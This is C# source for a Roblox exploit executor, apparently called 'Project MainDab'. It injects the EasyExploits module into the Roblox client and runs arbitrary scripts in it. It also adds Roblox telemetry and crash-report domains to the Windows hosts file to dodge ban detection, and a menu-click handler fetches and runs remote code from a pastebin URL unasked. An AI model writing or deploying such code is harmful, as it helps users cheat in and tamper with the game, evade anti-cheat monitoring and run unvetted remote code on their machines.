using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using EasyExploits;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace ProjectMainDab
{
    public partial class MainDab2016 : Form
    {
        public MainDab2016()
        {
            InitializeComponent();
        }

        private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Project MainDab", "Made by Main_EX#3898");
        }
        private Module m = new Module();
        private void antiBanWaveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (StreamWriter w = File.AppendText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"drivers\etc\hosts")))
            {
                w.WriteLine("# Anti-Banwave Code");
                w.WriteLine("127.0.0.1 data.roblox.com");
                w.WriteLine("127.0.0.1 roblox.sp.backtrace.io");
            }
            MessageBox.Show("AntiBanWave activated!");
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void execteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process[] pname = Process.GetProcessesByName("RobloxPlayerBeta");
            if (pname.Length == 0)
            {
                label1.Text = ("Please inject before executing!");
                label1.ForeColor = Color.Red;
            }
            else
            {
                m.ExecuteScript(richTextBox1.Text);
            }
        }

        private void injectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process[] pname = Process.GetProcessesByName("RobloxPlayerBeta");
            if (pname.Length == 0)
            {
                label1.Text = ("Roblox isn't started!");
                label1.ForeColor = Color.Red;
            }
            else
            {
                backgroundWorker1.RunWorkerAsync();
            }
        }

        private void scriptHubToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Hub1 form = new Hub1();
            form.Show();
        }

        private void serversideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string script = ("game.JointsService.WeldRequest:FireServer(\"gui\")");
            m.ExecuteScript(script);
            MessageBox.Show("Serverside ran! If the GUI dosen't show up, make sure that you are in a serversided game! Check our discord in #serversided-games for a list of serversided games!", "Notice");
        }

        private void menuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {
            string sex = ("loadstring(game:HttpGet(('https://pastebin.com/raw/SsG8y3HA'),true))()");
            m.ExecuteScript(sex);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Process[] pname = Process.GetProcessesByName("RobloxPlayerBeta");
            if (pname.Length == 0)
            {
                label1.Text = ("Please inject before executing!");
                label1.ForeColor = Color.Red;
            }
            else
            {
                m.ExecuteScript(richTextBox1.Text);
            }

            
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Process[] pname = Process.GetProcessesByName("RobloxPlayerBeta");
            if (pname.Length == 0)
            {
                label1.Text = ("Roblox isn't started!");
                label1.ForeColor = Color.Red;
            }
            else
            {
                backgroundWorker1.RunWorkerAsync();
            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            m.LaunchExploit();
            label1.Text = ("Injecting EasyExploit, please wait.");
            System.Threading.Thread.Sleep(5000);
            label1.Text = ("EasyExploits injected!");
            label1.ForeColor = Color.LightGreen;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            richTextBox1.Text = ("");
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (Functions.openfiledialog.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    string MainText = File.ReadAllText(Functions.openfiledialog.FileName);
                    richTextBox1.Text = MainText;
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error: Could not read file from disk. Original error: " + ex.Message);
                    Console.WriteLine("File can't be opened");
                }
            }
        }

        private void MainDab2016_Load(object sender, EventArgs e)
        {

        }
    }
}
